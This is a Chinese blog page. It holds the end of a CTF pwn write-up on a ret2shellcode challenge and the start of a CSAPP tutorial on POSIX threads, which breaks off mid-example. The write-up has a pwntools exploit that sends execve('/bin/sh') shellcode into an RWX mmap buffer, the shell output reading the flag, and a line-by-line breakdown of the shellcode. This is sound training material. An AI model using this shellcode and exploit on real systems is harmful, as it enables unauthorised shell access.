<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_400CA6</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dragon say: HaHa! you were supposed to have a normal&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RPG game, but I have changed it! you have no weapon and &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;skill! you could not defeat me !&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )				<span class="comment">//当a1[0]==a1[1]时就有巫师出手相助,否则嗝屁</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);</span><br><span class="line">    v1 = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);<span class="comment">//没有和文件描述符关联,则不把任何文件映射到进程的虚拟地址空间</span></span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);					<span class="comment">//从标准输入0即键盘读取至多0x100个字符,到v1缓冲区</span></span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD))v1)(<span class="number">0LL</span>);		<span class="comment">//一个函数指针,但是v1明明是一个虚拟地址空间的指针,强行作为函数指针</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="mmap"><code>mmap</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start , <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220518084118644.png"
alt="image-20220518084118644" />
<figcaption aria-hidden="true">image-20220518084118644</figcaption>
</figure>
<blockquote>
<p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。</p>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">认真分析mmap：是什么
为什么 怎么用 - 胡潇 - 博客园 (cnblogs.com)</a></p>
</blockquote>
<p>在本题中mmap要求内核创建一个<code>0x1000</code>大小的空间,</p>
<p><code>prot=7=001|010|100</code>即该空间具有可读写执行的权限,有可能要写入shellcode并在此处执行</p>
<blockquote>
<p>由于程序本身开启了NX保护即堆栈不可执行,</p>
<p>因此这里程序没有直接在栈上开缓冲区,而是故意使用了mmap新开了空间,并且赋予该空间<del>唱,跳,rap,篮球</del>读,写,执行的权限,</p>
<p>已经在疯狂暗示ret2shellcode了</p>
</blockquote>
</blockquote>
<p>只需要写入<code>shellcode</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)<span class="comment">#此句必须,不写的话无法获取shell</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Wizard: I will help you! USE YOU SPELL&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line">shellcode =asm(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>然后一个函数指针就会来执行shellcode</p>
<p>执行之后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">string</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">cyberpeace&#123;421c7c91f8fbfb8755cced825fc617ab&#125;</span><br></pre></td></tr></table></figure>
<h3
id="contextoslinux-archamd64"><code>context(os='linux', arch='amd64')</code></h3>
<p>设置pwntools环境,不同的操作系统架构会有不同的汇编指令</p>
<p>由于前面我们check时已经了解到string是一个amd64架构,linux操作系统的程序,因此需要设置一下"上下文"<code>context</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()//默认环境的shellcode</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;..........................&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/string]    </span><br><span class="line">└─# python3 shell.py</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        </span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    push 0x732f2f2f</span><br><span class="line">    push 0x6e69622f</span><br><span class="line">    mov ebx, esp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line">    push 0x1010101</span><br><span class="line">    xor dword ptr [esp], 0x1016972</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    push ecx /* null terminate */</span><br><span class="line">    push 4</span><br><span class="line">    pop ecx</span><br><span class="line">    add ecx, esp</span><br><span class="line">    push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0xb */</span><br><span class="line">    pop eax</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">..........................</span><br><span class="line">    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        </span><br><span class="line">    /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">    push 0x68</span><br><span class="line">    mov rax, 0x732f2f2f6e69622f</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">    /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">    push 0x1010101 ^ 0x6873</span><br><span class="line">    xor dword ptr [rsp], 0x1010101</span><br><span class="line">    xor esi, esi /* 0 */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push 8</span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* 0 */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* 0x3b */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<p>两个<code>shellcode</code>是不一样的</p>
<h3 id="shellcode">shellcode</h3>
<p>关于<code>linux amd64</code>上的<code>shellcode</code>:</p>
<p>它干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */        </span><br><span class="line">/* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push b&#x27;sh\x00&#x27; */</span><br><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>一开始</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br></pre></td></tr></table></figure>
<p>压栈的16进制数转化为ASCII码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hs///nib/</span><br></pre></td></tr></table></figure>
<p>这是小端存储的,翻译成人话是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin///sh</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, rsp</span><br></pre></td></tr></table></figure>
<p>把栈顶指针交给rdi保存,最后还要还回来</p>
<p>然后两条蜜汁语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br></pre></td></tr></table></figure>
<p>把0x1010101先和0x6873异或一下,然后再和0x1010101异或,这部相当于直接来0x6873吗?</p>
<p>翻译成ASCII码是<code>hs</code>,这是小端存储的,翻译成人话就是<code>sh</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br></pre></td></tr></table></figure>
<p>将0压栈</p>
<p>然后又是蜜汁操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br></pre></td></tr></table></figure>
<p>8先压栈然后退给<code>rsi</code>,然后<code>rsp</code>也加到<code>rsi</code>上,<code>rsi=rsp+8</code></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br></pre></td></tr></table></figure>
<p>rsi压栈然后获取rsp栈顶指针作为参数,</p>
<p>edx归0作为第三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br></pre></td></tr></table></figure>
<p>系统调用号约定用rax寄存器传递</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall</span><br></pre></td></tr></table></figure>
<p>陷阱,系统调用</p>
<h3 id="asmshellcode"><code>asm(shellcode)</code></h3>
<p>将汇编指令转化为机器码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(asm(shellcode))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span><br></pre></td></tr></table></figure>
<p>实际上是16进制表示的二进制码</p>
<h3 id="总结">总结</h3>
<p>关键点有两个</p>
<p>一是通过某些手段,修改main中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v4 = malloc(8uLL);</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br></pre></td></tr></table></figure>
<p>让v4的高低两个双字数值相等</p>
<p>诚如是则<code>sub_400CA6</code>中<code>if ( *a1 == a1[1] )</code>成立,下面就可以考虑向mmap创建的虚拟地址空间中写入<code>shellcode</code></p>
<p>二是写入shellcode之后,一个强行函数指针就会执行该shellcode区域</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/02/%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/02/%E7%BA%BF%E7%A8%8B%E5%B9%B6%E5%8F%91/" class="post-title-link" itemprop="url">CSAPP-chapter12 线程并发</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-02 01:00:00" itemprop="dateCreated datePublished" datetime="2022-06-02T01:00:00+08:00">2022-06-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-15 16:59:27" itemprop="dateModified" datetime="2022-06-15T16:59:27+08:00">2022-06-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="csapp-chapter12-线程并发">CSAPP-chapter12 线程并发</h1>
<h2 id="线程模型">线程模型</h2>
<p>引入线程概念之后,进程的职能只剩下组织资源.线程负责程序的执行</p>
<p>同一个进程的线程之间有共享也有私有资源</p>
<h3 id="线程私有资源">线程私有资源:</h3>
<p>1.线程ID,tid</p>
<p>2.线程栈及其栈顶指针</p>
<p>3.程序计数器PC,rip</p>
<p>4.程序状态字PSW,flags</p>
<p>5.通用目的寄存器</p>
<blockquote>
<p>上述五个合起来叫做 线程上下文</p>
</blockquote>
<h3 id="线程共享资源">线程共享资源</h3>
<p>进程用户虚拟地址空间中除了线程栈的其他部分</p>
<p>1.堆</p>
<p>2.只读代码段</p>
<p>3.全局变量区,.data,.bss</p>
<p>4.共享库</p>
<p>5.打开的文件</p>
<blockquote>
<p>实际上同一个进程的各个线程栈之间不设防,即可以通过全局变量指针等方法,使得一个线程可以访问修改另一个线程的栈空间</p>
</blockquote>
<h3 id="线程的特点">线程的特点</h3>
<p>每个进程执行伊始都是单一线程的,即主线程</p>
<p>从主线程创建的其他线程或者其他线程创建的线程都是<strong>对等线程</strong></p>
<p>即一个进程的所有线程都是对等线程.一个进程的线程之间没有父子关系一说.所有线程组成一个线程池.任何一个线程都可以杀死任何一个对等线程.</p>
<h3 id="posix线程">POSIX线程</h3>
<blockquote>
<p>POSIX:可移植操作系统接口</p>
</blockquote>
<p>线程概念落地实现,后面的实验都基于POSIX线程</p>
<p>源代码可以去看glibc库</p>
<p>在使用POSIX线程库函数时,需要动态链接<code>libpthread.so</code>库,因为gcc不会自动链接该库</p>
<p>比如<code>gcc main.c -lpthread -o main</code></p>
<h4 id="线程例程">线程例程</h4>
<p>线程是程序的一次执行,更准确的说法是函数的一次执行</p>
<p>线程的代码和局部数据被封装在一个函数中,如果只是从main函数中像以前一样调用改函数,则该函数就是一个普通函数.如果在main函数中创建一个新线程,让该新线程去执行该函数,则该函数此时就是"线程例程"</p>
<p>线程的使用方法与进程大不相同,多进程时,fork之后立刻产生新进程,用起来总是感觉别扭,区分不同的进程甚至需要在进程内部使用<code>getpid</code>等函数获得pid然后进行条件判断.</p>
<p>线程的使用是基于函数的,让一个线程去执行一个函数,使用更加自然.</p>
<h4 id="线程句柄pthread_t">线程句柄<code>pthread_t</code></h4>
<p><code>glibc-2.9\nptl\sysdeps\unix\sysv\linux\alpha\bits\pthreadtypes.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">pthread_t</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>线程标识符,本质为无符号长整形unsigned long</p>
</blockquote>
<p><code>pthread_t tid;</code>用于保存线程tid</p>
<h4
id="获取当前线程idpthread_self">获取当前线程id,<code>pthread_self</code></h4>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid=pthread_self();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in func,tid=%ld\n&quot;</span>,tid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid=pthread_self();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;in main,tid=%ld\n&quot;</span>,tid);</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─# gcc main.c -o main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pthread]</span><br><span class="line">└─# ./main</span><br><span class="line"><span class="keyword">in</span> main,tid=139945163630400</span><br><span class="line"><span class="keyword">in</span> func,tid=139945163630400</span><br></pre></td></tr></table></figure>
<p>每次运行,tid都是不同的数值,但是<code>main</code>和<code>func</code>两个函数中打印的tid都是相同的</p>
<p>因为func不是新线程执行的,它仍然是main线程执行的.</p>
<h4 id="创建线程pthread_create">创建线程<code>pthread_create</code></h4>
<p><code>pthread.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Create a new thread, starting with execution of START-ROUTINE</span></span><br><span class="line"><span class="comment">   getting passed ARG.  Creation attributed come from ATTR.  The new</span></span><br><span class="line"><span class="comment">   handle is stored in *NEWTHREAD.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">pthread_create</span> <span class="params">(   <span class="type">pthread_t</span> *__restrict __newthread,</span></span><br><span class="line"><span class="params">			               __const <span class="type">pthread_attr_t</span> *__restrict __attr,</span></span><br><span class="line"><span class="params">			               <span class="type">void</span> *(*__start_routine) (<span class="type">void</span> *),</span></span><br><span class="line"><span class="params">			               <span class="type">void</span> *__restrict __arg)</span> <span class="comment">//到此函数参数表已经结束,后面是Function Attributes修饰</span></span><br><span class="line">                         __THROW __<span class="title function_">nonnull</span> <span class="params">((<span class="number">1</span>, <span class="number">3</span>))</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>创建一个新线程,从<code>START_ROUTINE</code>函数,带着<code>ARG</code>参数
开始执行.</p>
<blockquote>
<p>线程函数的参数只能有一个,是一个</p>
</blockquote>
<p>以参数ATTR为线程属性</p>
<p>新的线程句柄以参数NEWTHREAD返回</p>
<p>如果创建新线程成功则函数返回0,否则返回数字代表错误原因</p>
</blockquote>
<blockquote>
<p>关于参数的<code>__restrict</code>修饰符</p>
<blockquote>
<p><code>__restrict</code></p>
<p>Like the <strong><code>__declspec</code> ( <a
target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/restrict?view=msvc-170"><code>restrict</code></a>
)</strong> modifier, the <strong><code>__restrict</code></strong>
keyword (two leading underscores '_') indicates that a symbol isn't
aliased in the current scope</p>
</blockquote>
<p>类似于<code>__declspec</code>修饰符,<code>__restrict</code>关键字(两个下划线作为前缀),指明本符号在当前作用域内没有别名</p>
<p><a
target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/349726808">C/C++关键字之restrict -
知乎 (zhihu.com)</a></p>
<p>restrict关键字用于修饰指针(C99标准)。</p>
<p>通过加上restrict关键字，编程者可提示编译器：<strong>在该指针的生命周期内，其指向的对象不会被别的指针所引用</strong></p>
</blockquote>
<blockquote>
<p>关于函数属性的<code>__nonull</code>修饰符<a
target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/Function-Attributes.html">Function
Attributes - Using the GNU Compiler Collection (GCC)</a></p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nonnull (`arg-index`, ...)</span><br></pre></td></tr></table></figure>
<p>The <code>nonnull</code> attribute specifies that some function
parameters should be non-null pointers. For instance, the
declaration:</p>
<p>nonnull 属性表明,一些函数参数应该是非空指针.比如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">extern void *</span><br><span class="line">my_memcpy (void *dest, const void *src, size_t len)</span><br><span class="line">        __attribute__((nonnull (1, 2)));</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
<p>causes the compiler to check that, in calls to
<code>my_memcpy</code>, arguments dest and src are non-null. If the
compiler determines that a null pointer is passed in an argument slot
marked as non-null, and the -Wnonnull option is enabled, a warning is
issued. The compiler may also choose to make optimizations based on the
knowledge that certain function arguments will not be null.</p>
<p><code>__attribute__((nonnull (1, 2)))</code>将会让编译器检查,对于函数my_memcpy,第一个参数dest和第二个参数src应该是非空指针.</p>
<p>如果编译器发现一个被标记为非空的参数实际上传了一个空指针,并且-Wnonnull
编译选项开启,那么编译器将会警告.</p>
<p>编译器还可能根据参数被修饰为非空进行一些优化</p>
<p>If no argument index list is given to the <code>nonnull</code>
attribute, all pointer arguments are marked as non-null.</p>
<p>如果没有给nonnull属性指明参数下标表,那么所有函数参数都将被标记为非空.</p>
</blockquote>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __attribute__((nonnull)) func(<span class="type">char</span> *s)&#123;&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func(<span class="literal">NULL</span>);		<span class="comment">//传递空指针作为参数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
